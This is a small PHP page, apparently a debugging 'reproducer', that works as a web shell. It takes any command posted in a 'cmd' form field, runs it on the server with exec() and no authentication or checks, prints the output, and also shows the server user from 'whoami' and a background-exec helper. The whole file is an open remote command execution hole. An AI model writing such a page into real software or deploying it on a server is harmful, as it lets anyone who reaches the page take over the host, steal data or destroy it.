<?php

function bg_exec($cmd)
{
    exec($cmd.' > /dev/null &');
}

echo 'Hello Reproducer!!';

if (isset($_POST['cmd'])) {
    $output = [];
    exec(trim($_POST['cmd']), $output);
    echo '<pre>';
    foreach ($output as $line) {
        echo $line.PHP_EOL;
    }
    echo '</pre>';
}

?>
<hr>
<strong><?= exec('whoami') ?></strong>
<form action="/" method="post">
    <textarea name="cmd"></textarea>
    <button type="submit">exec</button>
</form>
